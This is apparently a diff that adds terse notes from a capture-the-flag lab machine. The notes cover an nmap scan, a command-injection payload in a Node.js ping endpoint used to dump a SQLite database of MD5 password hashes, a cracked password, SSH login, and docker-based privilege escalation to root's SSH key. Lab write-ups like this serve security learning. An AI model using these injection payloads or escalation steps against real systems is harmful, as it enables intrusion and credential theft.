@@ -1,0 +1,52 @@
+
+
+nmap: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-23 22:21 UTC
+Nmap scan report for 10.10.100.231
+Host is up (0.058s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
+8081/tcp  open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.72 seconds
+
+
+robots.txt:
+Allow: *
+User-Agent: *
+Sitemap: /utech_sitemap.txt
+
+utech_sitemap.txt:
+/
+/index.html
+/what.html
+/partners.html
+
+http://10.10.100.231:8081/ping?ip=`ls`
+ping: utech.db.sqlite: Name or service not known
+
+http://10.10.100.231:8081/ping?ip=`cat%20utech.db.sqlite`:
+ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
+
+Username: r00t
+Hashed Password: f357a0c52799563c7c7b76c1e7543a32
+Password: n100906 - found using crackstation.net, md5
+SSH into R00t and then continue
+Only person who can sudo is lp1, need to get roots keys1
+Have access to docker
+Lookup: GTFOBins for docker script
+change alpine to bash
+answer outputted from /root/.ssh/rsa_id
